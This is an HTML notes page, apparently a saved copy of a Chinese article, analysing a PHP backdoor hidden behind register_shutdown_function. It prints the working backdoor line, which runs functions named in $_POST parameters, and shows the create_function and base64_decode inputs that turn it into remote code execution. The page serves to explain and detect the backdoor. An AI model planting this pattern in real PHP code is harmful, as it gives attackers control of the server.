@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>register_shutdown_function</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>register_shutdown_function</h1><br/><a href="https://zhuanlan.zhihu.com/p/28348742">https://zhuanlan.zhihu.com/p/28348742</a><br /><br /><br /><h2>在Shutdown函数中的后门</h2><br /><br /><br />让我们从简单的看起。在 <em><strong>@package.win.error.Libraries</strong></em> ，并且有这样一个函数：<br /><code>function win()  { register_shutdown_function($_POST[&#39;d&#39;](&#39;&#39;, $_POST[&#39;f&#39;]($_POST[&#39;c&#39;]))); }<br /></code>此处的 $_POST 参数看上去十分可疑，那么这个代码到底是不是后门呢？<br /><br /><br /><em><strong>register_shutdown_function</strong></em> 注册了一个在此脚本运行完毕后的操作。这意味着无论这个代码出现在哪一行，它只在执行完时才被调用。<br /><br /><br />这样的话，脚本执行完后调用的函数便是：<br /><code>$_POST[&#39;d&#39;](&#39;&#39;, $_POST[&#39;f&#39;]($_POST[&#39;c&#39;]))<br /></code>这行代码看上去如同加密一般。如果你不清楚黑客能用它干什么，让我们来想想黑客代入如下参数执行后会怎么样：<br /><code>d=create_function<br />f=base64_decode<br />c=some_base64_encoded_malicious_PHP_code<br /></code><br /><br /><br /><br />于是，便会这样：<br /><code>create_function(&#39;&#39;, base64_decode(some_base64_encoded_malicious_PHP_code))<br /></code><br /><br />现在便是一个正常的后门了。这个代码不需要被直接调用，因为shutdown函数会自动执行它。<p align="center"><img src="images\home.svg" height="22" width="22">  <a href="index.html">索引</a></p></div></body></html>
